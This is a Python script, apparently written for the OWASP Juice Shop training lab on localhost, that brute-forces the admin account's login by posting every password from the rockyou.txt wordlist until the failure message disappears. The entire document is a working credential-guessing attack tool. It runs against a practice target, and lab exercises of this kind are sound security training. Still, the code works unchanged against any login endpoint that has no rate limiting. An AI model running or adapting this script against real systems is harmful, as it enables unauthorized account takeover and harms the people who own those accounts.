import requests

# Target URL of the login page
url = "http://localhost:3000/rest/user/login"

# Email and password list files
email = "admin@juice-sh.op"
password_file = "/usr/share/wordlists/rockyou.txt"

# Starting line number
start_line = 90000  # Change this to the line you want to start from

def login_brute_force():
    # Open the password list
    with open(password_file, "r", encoding="latin-1") as file:
        for line_number, password in enumerate(file, 1):
            if line_number < start_line:
                continue  # Skip lines before the starting line

            password = password.strip()  # Removes any leading and trailing whitespace

            # Create the payload with the email and current password attempt
            data = {"email": email, "password": password}

            # Send POST request to the target URL
            response = requests.post(url, json=data)

            # Print the status code and response text for debugging
            print(f"Attempting password: {password} | Status Code: {response.status_code} | Response: {response.text}")

            # Check if the login was successful
            if "Invalid email or password." not in response.text:
                print(f"[+] Password found: {password}")
                return

            print(f"[-] Attempt failed: {password}")

    print("[-] Password not found in the list")

# Run the brute force function
login_brute_force()
